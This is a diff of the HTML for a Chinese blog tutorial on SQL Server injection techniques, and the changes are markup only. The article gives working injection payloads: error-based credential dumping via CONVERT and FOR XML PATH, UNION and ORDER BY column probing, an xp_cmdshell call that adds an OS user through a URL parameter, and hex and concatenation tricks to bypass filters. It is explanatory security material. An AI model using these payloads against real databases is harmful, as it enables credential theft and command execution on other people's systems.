@@ -112,17 +112,16 @@
 
 
 <meta name="description" content="针对 SQL Server 2008、MySQL5.1 和 Oracle 11g 三种数据库，简单归纳注入技巧。本篇为第一部分——SQL Server。">
-<meta name="keywords" content="SQL Injection">
 <meta property="og:type" content="article">
 <meta property="og:title" content="常见数据库注入技巧——SQL Server">
-<meta property="og:url" content="http://a2chitect.cn/2017/11/19/常见数据库注入技巧——SQL Server/index.html">
+<meta property="og:url" content="http://a2chitect.cn/2017/11/19/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94SQL%20Server/index.html">
 <meta property="og:site_name" content="Architect&#39;s Blog">
 <meta property="og:description" content="针对 SQL Server 2008、MySQL5.1 和 Oracle 11g 三种数据库，简单归纳注入技巧。本篇为第一部分——SQL Server。">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-11-19T09:19:28.804Z">
+<meta property="article:published_time" content="2017-11-19T06:40:15.000Z">
+<meta property="article:modified_time" content="2017-11-19T09:19:28.804Z">
+<meta property="article:author" content="Architect">
+<meta property="article:tag" content="SQL Injection">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="常见数据库注入技巧——SQL Server">
-<meta name="twitter:description" content="针对 SQL Server 2008、MySQL5.1 和 Oracle 11g 三种数据库，简单归纳注入技巧。本篇为第一部分——SQL Server。">
 
 
 
@@ -157,7 +156,7 @@
 
 
   <title> 常见数据库注入技巧——SQL Server | Architect's Blog </title>
-</head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
@@ -295,7 +294,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://a2chitect.cn/2017/11/19/常见数据库注入技巧——SQL Server/">
+    <link itemprop="mainEntityOfPage" href="http://a2chitect.cn/2017/11/19/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94SQL%20Server/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Architect">
@@ -354,7 +353,7 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
                     <span itemprop="name">Web安全</span>
                   </a>
                 </span>
@@ -396,9 +395,11 @@
       
         <p>针对 SQL Server 2008、MySQL5.1 和 Oracle 11g 三种数据库，简单归纳注入技巧。本篇为第一部分——SQL Server。</p>
 <a id="more"></a>
+
 <h3 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h3><h4 id="通过报错提取信息"><a href="#通过报错提取信息" class="headerlink" title="通过报错提取信息"></a>通过报错提取信息</h4><p>SQL Server 的错误提示十分详细，可以通过引发报错提取需要的信息。</p>
 <h5 id="通过-having-子句枚举表和列"><a href="#通过-having-子句枚举表和列" class="headerlink" title="通过 having 子句枚举表和列"></a>通过 having 子句枚举表和列</h5><p>假设数据库结构和查询语句如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">//表结构</div><div class="line">create table users（</div><div class="line">	id int not null identity(1,1),</div><div class="line">	username varchar(20) not null,</div><div class="line">	password varchar(20) not null,</div><div class="line">	privs int not null,</div><div class="line">	email varchar(50)</div><div class="line">)</div><div class="line"></div><div class="line">//查询语句</div><div class="line">select * from users where username=&apos;root&apos;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;表结构</span><br><span class="line">create table users（</span><br><span class="line">	id int not null identity(1,1),</span><br><span class="line">	username varchar(20) not null,</span><br><span class="line">	password varchar(20) not null,</span><br><span class="line">	privs int not null,</span><br><span class="line">	email varchar(50)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查询语句</span><br><span class="line">select * from users where username&#x3D;&#39;root&#39;</span><br></pre></td></tr></table></figure>
+
 <p>注入<code>&#39;having 1=1--</code>语句，由于SQL语言中 having 子句用于过滤组，因此会返回类似如下的错误：</p>
 <p><strong>“选择列表中的列“users.id”无效，因为该列未包含在聚合函数或 GROUP BY 子句中。”</strong></p>
 <p>得到表名 users 和其中的列名ID。</p>
@@ -409,64 +410,68 @@
 <ol>
 <li>嵌入子查询</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//比较数字和字符串</div><div class="line">select * from users where username=&apos;root&apos; and password=&apos;root&apos; and 1&gt;(select top 1 username from users)</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;比较数字和字符串</span><br><span class="line">select * from users where username&#x3D;&#39;root&#39; and password&#x3D;&#39;root&#39; and 1&gt;(select top 1 username from users)</span><br></pre></td></tr></table></figure>
+
 <p>错误提示：<strong>在将varchar值‘root’转换成数据类型 int 时失败。</strong></p>
 <p>利用此方法递归查询可得所有username：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select * from users where username=&apos;root&apos; and password=&apos;root&apos; and</div><div class="line">	1&gt;(select top 1 username from users where username not in(&apos;root&apos;))</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;root&#39; and password&#x3D;&#39;root&#39; and</span><br><span class="line">	1&gt;(select top 1 username from users where username not in(&#39;root&#39;))</span><br></pre></td></tr></table></figure>
+
 <ol>
 <li>CONVERT( ) 和 CASE( ) 函数（强制类型转换）</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select * from users where username=&apos;root&apos; and password=&apos;root&apos; and</div><div class="line">	1=CONVERT(int, (select top 1 users.username from users))</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;root&#39; and password&#x3D;&#39;root&#39; and</span><br><span class="line">	1&#x3D;CONVERT(int, (select top 1 users.username from users))</span><br></pre></td></tr></table></figure>
+
 <p>可以使用 FOR XML PATH 语句将查询的数据生成XML，代替重复递归操作：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select * from users where username=&apos;root&apos; and password=&apos;root&apos; and</div><div class="line">	1=CONVERT(int, (select stuff((select &apos;,&apos;+ users.username,&apos;|&apos; + users.password from users for xml path(&apos;&apos;)),1,1,&apos;&apos;)))</div></pre></td></tr></table></figure>
-<p>抛出异常：<strong>“在将 nvarchar 值 ‘root|root,admin|admin,xxser|xxser’ 转换成数据类型 int 时失败。” </strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;root&#39; and password&#x3D;&#39;root&#39; and</span><br><span class="line">	1&#x3D;CONVERT(int, (select stuff((select &#39;,&#39;+ users.username,&#39;|&#39; + users.password from users for xml path(&#39;&#39;)),1,1,&#39;&#39;)))</span><br></pre></td></tr></table></figure>
+
+<p>抛出异常：**”在将 nvarchar 值 ‘root|root,admin|admin,xxser|xxser’ 转换成数据类型 int 时失败。” **</p>
 <h4 id="获取元数据"><a href="#获取元数据" class="headerlink" title="获取元数据"></a>获取元数据</h4><p>SQL Server 中常见的系统数据库视图见下表。</p>
 <table>
 <thead>
 <tr>
-<th style="text-align:center">数据库视图</th>
-<th style="text-align:center">说 明</th>
+<th align="center">数据库视图</th>
+<th align="center">说 明</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td style="text-align:center"><strong>sys.databases</strong></td>
-<td style="text-align:center">SQL Server 中的所有数据库</td>
+<tbody><tr>
+<td align="center"><strong>sys.databases</strong></td>
+<td align="center">SQL Server 中的所有数据库</td>
 </tr>
 <tr>
-<td style="text-align:center"><strong>sys.sql_logins</strong></td>
-<td style="text-align:center">SQL Server 中的所有登录名</td>
+<td align="center"><strong>sys.sql_logins</strong></td>
+<td align="center">SQL Server 中的所有登录名</td>
 </tr>
 <tr>
-<td style="text-align:center"><strong>information_schema.tables</strong></td>
-<td style="text-align:center">当前用户数据库中的表</td>
+<td align="center"><strong>information_schema.tables</strong></td>
+<td align="center">当前用户数据库中的表</td>
 </tr>
 <tr>
-<td style="text-align:center"><strong>information_schema.columns</strong></td>
-<td style="text-align:center">当前用户数据库中的列</td>
+<td align="center"><strong>information_schema.columns</strong></td>
+<td align="center">当前用户数据库中的列</td>
 </tr>
 <tr>
-<td style="text-align:center">sys.all_columns</td>
-<td style="text-align:center">用户定义对象和系统对象的所有列的联合</td>
+<td align="center">sys.all_columns</td>
+<td align="center">用户定义对象和系统对象的所有列的联合</td>
 </tr>
 <tr>
-<td style="text-align:center">sys.database_principals</td>
-<td style="text-align:center">数据库中每个权限或列异常权限</td>
+<td align="center">sys.database_principals</td>
+<td align="center">数据库中每个权限或列异常权限</td>
 </tr>
 <tr>
-<td style="text-align:center">sys.database_files</td>
-<td style="text-align:center">存储在数据库中的数据库文件</td>
+<td align="center">sys.database_files</td>
+<td align="center">存储在数据库中的数据库文件</td>
 </tr>
 <tr>
-<td style="text-align:center">sysobjects</td>
-<td style="text-align:center">数据库中创建的每个对象（例如约束、日志、存储过程）</td>
+<td align="center">sysobjects</td>
+<td align="center">数据库中创建的每个对象（例如约束、日志、存储过程）</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <p>从这些视图中可以获得有价值的元数据，例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//获得当前数据库的表名</div><div class="line">select table_name from information_schema.tables</div><div class="line">//获得当前表的列名</div><div class="line">select column_name from information_schema.columns where table_name=&apos;student&apos;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;获得当前数据库的表名</span><br><span class="line">select table_name from information_schema.tables</span><br><span class="line">&#x2F;&#x2F;获得当前表的列名</span><br><span class="line">select column_name from information_schema.columns where table_name&#x3D;&#39;student&#39;</span><br></pre></td></tr></table></figure>
+
 <h4 id="Order-by-子句"><a href="#Order-by-子句" class="headerlink" title="Order by 子句"></a>Order by 子句</h4><p>Order by 子句常用于探测表的列数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//正常语句</div><div class="line">select id,username,password from users where id=1</div><div class="line"></div><div class="line">//不断增加 ORDER BY 后面的列标号</div><div class="line">select id,username,password from users where id=1 order by 1</div><div class="line">select id,username,password from users where id=1 order by 2</div><div class="line">select id,username,password from users where id=1 order by 3</div><div class="line">......</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;正常语句</span><br><span class="line">select id,username,password from users where id&#x3D;1</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不断增加 ORDER BY 后面的列标号</span><br><span class="line">select id,username,password from users where id&#x3D;1 order by 1</span><br><span class="line">select id,username,password from users where id&#x3D;1 order by 2</span><br><span class="line">select id,username,password from users where id&#x3D;1 order by 3</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
 <p>假设 users 表共有三列，则当 order by 4 时就会报错：</p>
 <p><strong>“ORDER BY 位置号 4 超出了选择列表中项数的范围”</strong></p>
 <h4 id="UNION-查询"><a href="#UNION-查询" class="headerlink" title="UNION 查询"></a>UNION 查询</h4><p>UNION 查询要遵循两个基本规则：</p>
@@ -475,7 +480,8 @@
 <li>数据类型必须兼容</li>
 </ul>
 <h5 id="union-查询探测列数"><a href="#union-查询探测列数" class="headerlink" title="union 查询探测列数"></a>union 查询探测列数</h5><p>除了用 order by 语句推断列数外，还可以使用 union 查询：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//正常语句</div><div class="line">select id,username,password from users where id=1</div><div class="line"></div><div class="line">//不断增加ORDER BY后面的列标号</div><div class="line">select id,username,password from users where id=1 union select null</div><div class="line">select id,username,password from users where id=1 union select null,null</div><div class="line">select id,username,password from users where id=1 union select null,null,null</div><div class="line">......</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;正常语句</span><br><span class="line">select id,username,password from users where id&#x3D;1</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不断增加ORDER BY后面的列标号</span><br><span class="line">select id,username,password from users where id&#x3D;1 union select null</span><br><span class="line">select id,username,password from users where id&#x3D;1 union select null,null</span><br><span class="line">select id,username,password from users where id&#x3D;1 union select null,null,null</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
 <p>若 null 的数量与表中字段数不同，则会报错：<br><strong>“使用 UNION、INTERSECT 或 EXCEPT 运算符合并的所有查询必须在其目标列表中有相同数目的表达式”</strong></p>
 <ul>
 <li><p><code>union select null,null,...</code> 和 <code>union select 1,2,3</code>  的区别：</p>
@@ -483,83 +489,88 @@
 </li>
 </ul>
 <h5 id="union-查询敏感信息"><a href="#union-查询敏感信息" class="headerlink" title="union 查询敏感信息"></a>union 查询敏感信息</h5><p>假设已得知列数为 4，可以使用如下语句注入：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">......id=1 union select &apos;x&apos;,null,null,null from sysobjects where xtype=&apos;U&apos;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">......id&#x3D;1 union select &#39;x&#39;,null,null,null from sysobjects where xtype&#x3D;&#39;U&#39;</span><br></pre></td></tr></table></figure>
+
 <p>如果第一行数据类型不匹配，数据库将会报错，可递归查询直至语句正常执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">......id=1 union select null,&apos;x&apos;,null,null from sysobjects where xtype=&apos;U&apos;</div><div class="line">......id=1 union select null,null,&apos;x&apos;,null from sysobjects where xtype=&apos;U&apos;</div><div class="line">......</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">......id&#x3D;1 union select null,&#39;x&#39;,null,null from sysobjects where xtype&#x3D;&#39;U&#39;</span><br><span class="line">......id&#x3D;1 union select null,null,&#39;x&#39;,null from sysobjects where xtype&#x3D;&#39;U&#39;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
 <p>语句执行正常，代表数据类型兼容，就可以将 x 换为 SQL 语句，查询敏感信息。</p>
 <h4 id="利用系统函数"><a href="#利用系统函数" class="headerlink" title="利用系统函数"></a>利用系统函数</h4><p>所有的数据库系统都会提供很多内置的系统函数，这些函数中有些可以直接返回数据库名、用户名等敏感信息，有些可以对数据进行处理（例如：字符串连接、截取；ASCII码转换等）。这些系统函数为 SQL 注入提供了很大的便利。</p>
 <p>SQL Server 中的常用函数表如下：</p>
 <table>
 <thead>
 <tr>
-<th style="text-align:center">函 数</th>
-<th style="text-align:center">说 明</th>
+<th align="center">函 数</th>
+<th align="center">说 明</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td style="text-align:center">suser_name()</td>
-<td style="text-align:center">返回用户的登录标识名</td>
+<tbody><tr>
+<td align="center">suser_name()</td>
+<td align="center">返回用户的登录标识名</td>
 </tr>
 <tr>
-<td style="text-align:center">user_name()</td>
-<td style="text-align:center">基于指定的标识号返回数据库用户名</td>
+<td align="center">user_name()</td>
+<td align="center">基于指定的标识号返回数据库用户名</td>
 </tr>
 <tr>
-<td style="text-align:center">db_name()</td>
-<td style="text-align:center">返回数据库名称</td>
+<td align="center">db_name()</td>
+<td align="center">返回数据库名称</td>
 </tr>
 <tr>
-<td style="text-align:center">is_number(‘db_owner’)</td>
-<td style="text-align:center">是否为数据库角色</td>
+<td align="center">is_number(‘db_owner’)</td>
+<td align="center">是否为数据库角色</td>
 </tr>
 <tr>
-<td style="text-align:center">convert(int,’5’)</td>
-<td style="text-align:center">数据类型转换</td>
+<td align="center">convert(int,’5’)</td>
+<td align="center">数据类型转换</td>
 </tr>
 <tr>
-<td style="text-align:center">stuff()</td>
-<td style="text-align:center">字符串截取</td>
+<td align="center">stuff()</td>
+<td align="center">字符串截取</td>
 </tr>
 <tr>
-<td style="text-align:center">ascii()</td>
-<td style="text-align:center">取ASCII码</td>
+<td align="center">ascii()</td>
+<td align="center">取ASCII码</td>
 </tr>
 <tr>
-<td style="text-align:center">char()</td>
-<td style="text-align:center">根据ASCII码取字符</td>
+<td align="center">char()</td>
+<td align="center">根据ASCII码取字符</td>
 </tr>
 <tr>
-<td style="text-align:center">getdate()</td>
-<td style="text-align:center">返回日期</td>
+<td align="center">getdate()</td>
+<td align="center">返回日期</td>
 </tr>
 <tr>
-<td style="text-align:center">count()</td>
-<td style="text-align:center">返回组中总条数</td>
+<td align="center">count()</td>
+<td align="center">返回组中总条数</td>
 </tr>
 <tr>
-<td style="text-align:center">cast()</td>
-<td style="text-align:center">将一种数据类型的表达式显式转换为另一种数据类型</td>
+<td align="center">cast()</td>
+<td align="center">将一种数据类型的表达式显式转换为另一种数据类型</td>
 </tr>
 <tr>
-<td style="text-align:center">rand()</td>
-<td style="text-align:center">返回随机值</td>
+<td align="center">rand()</td>
+<td align="center">返回随机值</td>
 </tr>
 <tr>
-<td style="text-align:center">is_srvrolemember()</td>
-<td style="text-align:center">指定 SQL Server 登录名是否为指定服务器角色的成员</td>
+<td align="center">is_srvrolemember()</td>
+<td align="center">指定 SQL Server 登录名是否为指定服务器角色的成员</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <h4 id="利用存储过程"><a href="#利用存储过程" class="headerlink" title="利用存储过程"></a>利用存储过程</h4><p>存储过程（Stored Procedure）是在大型数据库系统中为完成特定功能的一组 SQL 语句集，存储在数据库中，经过第一次编译后再次调用不需要再次编译，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。</p>
 <p>常见的存储过程功能有：执行系统命令、查看注册表、读取磁盘目录等。</p>
 <p>攻击者最常用的存储过程是 <code>xp_cmdshell</code> ,允许用户执行操作系统命令，例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.secbug.org/test.aspx?id=1;exec xp_cmdshell &apos;net user test test /add&apos;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.secbug.org&#x2F;test.aspx?id&#x3D;1;exec xp_cmdshell &#39;net user test test &#x2F;add&#39;</span><br></pre></td></tr></table></figure>
+
 <p>使用存储过程，必须先拥有相应的权限。</p>
 <h4 id="动态执行"><a href="#动态执行" class="headerlink" title="动态执行"></a>动态执行</h4><p>SQL Server 支持动态执行语句，用户可以提交一个字符串来执行 SQL 语句，例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">exec(&apos;select username,password from users&apos;)</div><div class="line"></div><div class="line">//绕过关键词过滤</div><div class="line">exec(&apos;selec&apos;+&apos;t userneme,password fro&apos;+&apos;m users&apos;)</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec(&#39;select username,password from users&#39;)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;绕过关键词过滤</span><br><span class="line">exec(&#39;selec&#39;+&#39;t userneme,password fro&#39;+&#39;m users&#39;)</span><br></pre></td></tr></table></figure>
+
 <p>可以通过定义十六进制的SQL语句，使用 exec 函数执行，可以绕过对单引号的过滤机制：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">declare @query varchar(888)</div><div class="line">select @query=0x73656C6563742031</div><div class="line">exec(@query)</div><div class="line"></div><div class="line">//以上命令连接起来</div><div class="line">declare/**/@query/**/varchar(888)/**/select/**/@query=0x73656C6563742031/**/exec(@query)</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">declare @query varchar(888)</span><br><span class="line">select @query&#x3D;0x73656C6563742031</span><br><span class="line">exec(@query)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;以上命令连接起来</span><br><span class="line">declare&#x2F;**&#x2F;@query&#x2F;**&#x2F;varchar(888)&#x2F;**&#x2F;select&#x2F;**&#x2F;@query&#x3D;0x73656C6563742031&#x2F;**&#x2F;exec(@query)</span><br></pre></td></tr></table></figure>
+
+
+
 <p>（有待更多补充和实践）</p>
 
       
@@ -603,7 +614,7 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/09/10/由汉诺塔想到的/" rel="next" title="由汉诺塔想到的">
+              <a href="/2017/09/10/%E7%94%B1%E6%B1%89%E8%AF%BA%E5%A1%94%E6%83%B3%E5%88%B0%E7%9A%84/" rel="next" title="由汉诺塔想到的">
                 <i class="fa fa-chevron-left"></i> 由汉诺塔想到的
               </a>
             
@@ -613,7 +624,7 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/11/29/Kali-Linux-2017-安装配置/" rel="prev" title="Kali Linux 2017 安装配置">
+              <a href="/2017/11/29/Kali-Linux-2017-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/" rel="prev" title="Kali Linux 2017 安装配置">
                 Kali Linux 2017 安装配置 <i class="fa fa-chevron-right"></i>
               </a>
             
@@ -798,19 +809,19 @@
 
 
 <!--<div class="powered-by">
-  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+  由 <a class="theme-link" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 强力驱动
 </div>
 
 <div class="theme-info">
   主题 -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">
     NexT.Pisces
   </a>
 </div>
 -->
 
 
-<p>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></p>
+<p>Hosted by <a href="https://pages.coding.me" target="_blank" rel="noopener" style="font-weight: bold">Coding Pages</a></p>
         
 <div class="busuanzi-count">
   <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
